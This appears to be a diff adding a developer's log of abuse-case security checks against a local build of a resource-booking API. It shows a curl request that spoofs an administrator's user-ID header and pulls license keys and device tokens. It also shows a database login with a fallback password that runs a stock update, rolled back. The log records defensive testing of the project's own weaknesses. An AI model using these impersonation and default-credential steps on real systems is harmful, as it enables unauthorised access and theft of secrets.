@@ -1,0 +1,18 @@
+Abuse case checks — 2026-11-15 ~21:33 UTC
+Stack: local docker compose, built from 4d39740. Run by me from the repository root; shell prompt removed.
+
+1) AC1 / AC4: the allocations listing, called while claiming to be the administrator (V1),
+   returns license keys and device tokens in plain text
+
+$ B=http://localhost:8080/api/v1
+$ curl -s "$B/assets/allocations?courseId=10000000-0000-4000-8000-000000000001" -H "X-User-Id: 40000000-0000-4000-8000-000000000006" | grep -o '"licenseKeys":\[[^]]*\]\|"token":"[^"]*"' | head
+"token":"HW-5AA06BA1752E05D8C5F0"
+"licenseKeys":["JBIDE-7K2M-Q9XA"]
+
+2) AC5: through the network login with the fallback password (V6), a direct stock update
+   succeeds; rolled back, so nothing changed
+
+$ docker run --rm -e PGPASSWORD=resourcehub_dev postgres:18 psql -h host.docker.internal -U resourcehub -d resourcehub -c 'BEGIN' -c "UPDATE assets SET \"RemainingUnits\" = 0 WHERE \"Name\" = 'Raspberry Pi 5 kit'" -c 'ROLLBACK'
+BEGIN
+UPDATE 1
+ROLLBACK
